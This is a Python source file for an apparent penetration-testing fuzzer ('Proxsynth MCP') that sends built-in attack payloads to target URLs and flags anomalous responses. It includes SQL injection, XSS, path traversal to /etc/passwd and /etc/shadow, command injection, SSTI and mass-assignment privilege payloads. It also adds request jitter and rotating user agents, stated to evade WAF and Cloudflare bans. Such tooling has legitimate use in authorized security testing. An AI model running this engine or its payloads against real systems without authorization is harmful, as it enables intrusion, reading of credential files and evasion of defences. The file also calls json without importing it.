"""
Proxsynth MCP - Parameter Fuzzer / Mini-Intruder Engine
High-performance asynchronous parameter fuzzing with position markers (§...§),
automated baseline differential analysis, and offensive anomaly detection.
"""

import re
import time
import random
import asyncio
import urllib.parse
from typing import Dict, Any, List, Optional, Tuple
import httpx
from backend.user_agents import apply_rotating_user_agent

# Predefined curated pentest payload dictionaries
BUILTIN_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3,4--",
        "1' AND 1=2--",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--",
        "1' ORDER BY 1--",
        "1' ORDER BY 20--"
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'\"><svg/onload=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">",
        "<details open ontoggle=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}"
    ],
    "traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "..%2f..%2f..%2fetc%2fpasswd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/etc/shadow"
    ],
    "cmd_injection": [
        "; id",
        "| whoami",
        "$(id)",
        "; cat /etc/passwd",
        "& whoami",
        "| dir",
        "`whoami`"
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
        "*{7*7}",
        "#{7*7}"
    ],
    "auth_bypass": [
        "admin",
        "root",
        "guest",
        "true",
        "false",
        "0",
        "1",
        "null",
        "undefined",
        "NaN"
    ],
    "business_logic": [
        "-1",
        "-9999",
        "-0.01",
        "0",
        "0.00",
        "0.0000001",
        "0.004",
        "2147483648",
        "9223372036854775808",
        "NaN",
        "Infinity",
        "-Infinity",
        "1e10",
        "1e-10"
    ],
    "mass_assignment": [
        '{"role": "admin"}',
        '{"is_admin": true}',
        '{"isAdmin": true}',
        '{"permissions": ["*"]}',
        '{"verified": true}',
        '{"tier": "enterprise"}',
        '{"balance": 999999}',
        '{"discount": 100}',
        '{"org_id": 1}',
        '{"plan": "unlimited"}'
    ]
}

MARKER_REGEX = re.compile(r"§([^§]*)§")

SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"pg_query\(\):",
    r"sqlite3::sqlexception",
    r"ora-01756",
    r"syntax error at or near",
    r"microsoft ole db provider for odbc drivers"
]


def extract_markers(text: str) -> List[Tuple[int, int, str]]:
    """Finds all instances of §marker§ and returns (start, end, inner_value)."""
    return [(m.start(), m.end(), m.group(1)) for m in MARKER_REGEX.finditer(text)]


def replace_markers(template: str, replacement: str) -> str:
    """Replaces all §...§ markers with the given replacement string."""
    return MARKER_REGEX.sub(replacement, template)


def has_markers(url: str, body: str, headers: Dict[str, str]) -> bool:
    """Checks whether URL, body, or headers contain the §marker§ delimiter."""
    if MARKER_REGEX.search(url):
        return True
    if body and MARKER_REGEX.search(body):
        return True
    for v in headers.values():
        if MARKER_REGEX.search(str(v)):
            return True
    return False


async def run_fuzz_attack(
    base_url: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    body: Optional[str] = "",
    payloads: Optional[List[str]] = None,
    concurrency: int = 5,
    delay_ms: Optional[float] = None,
    jitter_ms: Optional[float] = None,
    upstream_proxy: Optional[str] = None,
    project: str = "default",
    agent_id: str = "primary_agent"
) -> Dict[str, Any]:
    """
    Executes a multi-threaded parameter fuzzing attack with automatic baseline comparison,
    adaptive rate-limiting, and randomized jitter to prevent WAF / Imperva / Cloudflare bot-bans.
    """
    headers = headers or {}
    body = body or ""
    payloads = payloads or BUILTIN_PAYLOADS["sqli"]
    method = method.upper().strip()

    # Determine effective rate limiting delay & jitter
    eff_delay = delay_ms
    if eff_delay is None:
        try:
            from backend.database import SessionLocal, Project
            db_p = SessionLocal()
            p_obj = db_p.query(Project).filter(Project.name == project.lower()).first()
            if p_obj and p_obj.delay_ms and p_obj.delay_ms > 0:
                eff_delay = float(p_obj.delay_ms)
            db_p.close()
        except Exception:
            pass
    if eff_delay is None:
        eff_delay = 50.0  # Default 50ms pacing between requests to avoid Imperva bans

    eff_jitter = jitter_ms if jitter_ms is not None else (eff_delay * 0.5)

    proxy_kwargs = {}
    if upstream_proxy and upstream_proxy.strip():
        proxy_kwargs["proxy"] = upstream_proxy.strip()
    else:
        proxy_kwargs["proxy"] = None
        proxy_kwargs["trust_env"] = False

    # Determine baseline template by stripping markers and keeping inner default value
    baseline_url = MARKER_REGEX.sub(r"\1", base_url)
    baseline_body = MARKER_REGEX.sub(r"\1", body)
    baseline_headers = {k: MARKER_REGEX.sub(r"\1", str(v)) for k, v in headers.items()}
    apply_rotating_user_agent(baseline_headers)

    # 1. Baseline Request & Concurrent Attacks with shared connection-pooled client
    baseline_result = {
        "status_code": 0,
        "length": 0,
        "duration_ms": 0,
        "response_body_preview": ""
    }

    sem = asyncio.Semaphore(concurrency)
    results: List[Dict[str, Any]] = []

    limits = httpx.Limits(max_keepalive_connections=concurrency, max_connections=concurrency * 2, keepalive_expiry=30.0)
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=20.0, limits=limits, **proxy_kwargs) as client:
        # 1. Baseline Request
        try:
            t0 = time.time()
            content_bytes = baseline_body.encode("utf-8") if baseline_body else None
            res = await client.request(
                method=method,
                url=baseline_url,
                headers=baseline_headers,
                content=content_bytes
            )
            dur = int((time.time() - t0) * 1000)
            baseline_result = {
                "status_code": res.status_code,
                "length": len(res.content),
                "duration_ms": dur,
                "response_body_preview": res.text[:500] if res.text else ""
            }
        except Exception as ex:
            baseline_result["error"] = str(ex)

        # 2. Concurrently execute attacks
        async def _fuzz_worker(index: int, payload: str):
            req_url = replace_markers(base_url, payload)
            req_body = replace_markers(body, payload)
            req_headers = {k: replace_markers(str(v), payload) for k, v in headers.items()}
            apply_rotating_user_agent(req_headers)

            async with sem:
                # Rate Limiting & Anti-Ban Pacing
                if eff_delay > 0 or eff_jitter > 0:
                    jit = random.uniform(0, max(0.0, eff_jitter)) if eff_jitter > 0 else 0.0
                    sleep_time = max(0.0, (eff_delay + jit) / 1000.0)
                    if sleep_time > 0:
                        await asyncio.sleep(sleep_time)
                item = {
                    "id": index + 1,
                    "payload": payload,
                    "status_code": None,
                    "duration_ms": 0,
                    "length": 0,
                    "delta": 0,
                    "anomalies": [],
                    "error": None,
                    "preview": ""
                }
                try:
                    t0 = time.time()
                    b_bytes = req_body.encode("utf-8") if req_body else None
                    resp = await client.request(
                        method=method,
                        url=req_url,
                        headers=req_headers,
                        content=b_bytes
                    )
                    dur = int((time.time() - t0) * 1000)
                    resp_len = len(resp.content)
                    delta = resp_len - baseline_result["length"]
                    item["status_code"] = resp.status_code
                    item["duration_ms"] = dur
                    item["length"] = resp_len
                    item["delta"] = delta
                    text = resp.text or ""
                    item["preview"] = text[:600]

                    # Anomaly Heuristics
                    anomalies = []
                    # 1. Reflected payload
                    if payload in text:
                        anomalies.append("REFLECTED")
                    # 2. Status code shift
                    if baseline_result["status_code"] and resp.status_code != baseline_result["status_code"]:
                        anomalies.append(f"STATUS_{resp.status_code}")
                    # 3. High length delta (> 20% or > 250 bytes)
                    if abs(delta) > 250:
                        anomalies.append("DELTA_LENGTH")
                    # 4. Latency anomaly (e.g. sleep payload taking > 1800ms while baseline was < 500ms)
                    if dur > 1800 and baseline_result["duration_ms"] < 600:
                        anomalies.append("TIME_DELAY")
                    # 5. SQL Error Leaks
                    lower_text = text.lower()
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, lower_text):
                            anomalies.append("SQL_ERROR_LEAK")
                            break
                    # 6. SSTI arithmetic evaluation (e.g. 7*7 -> 49)
                    if ("7*7" in payload) and ("49" in text) and ("49" not in baseline_result.get("response_body_preview", "")):
                        anomalies.append("SSTI_EVALUATED_49")

                    item["anomalies"] = anomalies

                    if anomalies:
                        try:
                            from backend.forward_proxy import _dispatch_log
                            import urllib.parse
                            parsed_fz = urllib.parse.urlparse(req_url)
                            is_critical = any(a in ["SQL_ERROR_LEAK", "SSTI_EVALUATED_49"] for a in anomalies)
                            await _dispatch_log({
                                "project": project,
                                "agent_id": agent_id,
                                "source": "FUZZER",
                                "method": method,
                                "url": req_url,
                                "host": parsed_fz.netloc,
                                "path": parsed_fz.path or "/",
                                "status_code": resp.status_code,
                                "duration_ms": dur,
                                "request_headers": req_headers,
                                "request_body": req_body,
                                "response_headers": dict(resp.headers),
                                "response_body": text,
                                "reasoning": f"[Parameter Fuzzer Anomaly: {', '.join(anomalies)}] Payload: {payload}",
                                "flag_status": "CONFIRMED" if is_critical else "POTENTIAL",
                                "finding_title": f"Fuzzing Anomaly Detected: {', '.join(anomalies)}",
                                "finding_severity": "HIGH" if is_critical else "MEDIUM",
                                "payload_hint": payload
                            })
                        except Exception:
                            pass
                except Exception as e:
                    item["error"] = str(e)
                    item["anomalies"] = ["TRANSPORT_ERROR"]

                results.append(item)

        tasks = [_fuzz_worker(i, p) for i, p in enumerate(payloads)]
        await asyncio.gather(*tasks)

    # Sort results by ID
    results.sort(key=lambda x: x["id"])

    # Count anomalies
    flagged_count = sum(1 for r in results if len(r["anomalies"]) > 0)

    # Ensure clean fuzzing session is recorded in HttpLog if no anomalies triggered individual logs
    if flagged_count == 0:
        try:
            from backend.forward_proxy import _dispatch_log
            import urllib.parse
            parsed_base = urllib.parse.urlparse(baseline_url)
            await _dispatch_log({
                "project": project,
                "agent_id": agent_id,
                "source": "FUZZER",
                "method": method,
                "url": baseline_url,
                "host": parsed_base.netloc,
                "path": parsed_base.path or "/",
                "status_code": baseline_result.get("status_code", 200),
                "duration_ms": baseline_result.get("duration_ms", 0),
                "request_headers": baseline_headers,
                "request_body": baseline_body,
                "response_headers": {},
                "response_body": json.dumps({"total_payloads": len(payloads), "anomalies_detected": 0, "status": "CLEAN"}),
                "reasoning": f"[Parameter Fuzzer Complete: {len(payloads)} payloads tested, 0 anomalies]",
                "flag_status": "CLEAN",
                "finding_title": "",
                "finding_severity": "INFO"
            })
        except Exception:
            pass

    return {
        "baseline": baseline_result,
        "total_payloads": len(payloads),
        "anomalies_detected": flagged_count,
        "results": results
    }
